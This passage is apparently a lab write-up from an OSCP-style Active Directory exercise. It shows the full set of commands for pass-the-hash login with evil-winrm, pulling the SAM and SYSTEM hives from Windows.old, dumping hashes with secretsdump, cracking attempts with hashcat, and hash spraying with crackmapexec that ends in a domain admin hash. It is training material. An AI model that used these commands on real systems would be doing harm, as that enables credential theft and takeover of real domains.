We directly jumped into Initial Foothold because we already have user Celia NTLM hash and she is local admin of MS02 (T2).

**Now will try get a shell on MS02 with the Celia creds using Evil-winrm:**
```
evil-winrm -i 10.10.151.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
```
![[Pasted image 20240602170026.png]]
Boom......! We get into MS02 as Celia.almeda

Though in crackmapexec winrm show that we are the local admin of MS02, we can't list the administrator directory also we don't have admin level privileges.

![[Pasted image 20240602171100.png]]

So what we do is, enumerate the MS02 further.

**First will check the C Directory:**
![[Pasted image 20240602172952.png]]
There is an interesting directory **Windows.old**. 

**Lets enumerate that:**
![[Pasted image 20240602173124.png]]

Okay, will check our permissions on this directory, especially \\**Windows.old\\Windows\\system32**

![[Pasted image 20240602173325.png]]
Great, we have access over this directory because we are authenticated user.

Now will try to copy two important files **SYSTEM and SAM** from system32 directory to our kali machine:
```
download C:\windows.old\Windows\System32\SAM /root/offsec/oscp/AD/T2/SAM
download C:\windows.old\Windows\System32\SYSTEM /root/offsec/oscp/AD/T2/SYSTEM
```

![[Pasted image 20240602173618.png]]
![[Pasted image 20240602173633.png]]

![[Pasted image 20240602173748.png]]
We got it..!

**So, now will get the NTLM hashes from this files using Impacket-secretdump:**
```
impacket-secretsdump -sam SAM -system SYSTEM local
```

![[Pasted image 20240602173931.png]]
As always, will save it in a file and crack using hashcat.

**Letsss carck the hash:**
```
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt --force
```

![[Pasted image 20240602174105.png]]
Again we can't crack it, so will do the same as we did  in MS01, brute forcing with hashes.

**Lets Brute force using Crackmapexec: I have saved the usernames and hashes in separate files**
```
crackmapexec smb 10.10.151.0/24 -u users.txt -H ntlm.hash --continue-on-success --shares
```

![[Pasted image 20240602174339.png]]

![[Pasted image 20240602174357.png]]
So, Finally we got the Domain admins NTLM hash, **tom_admin** it is.

No need to Privilege escalation in MS02 (T2), Because we already got the domain admin's Ntlm hash, so we can directly go to DC01.
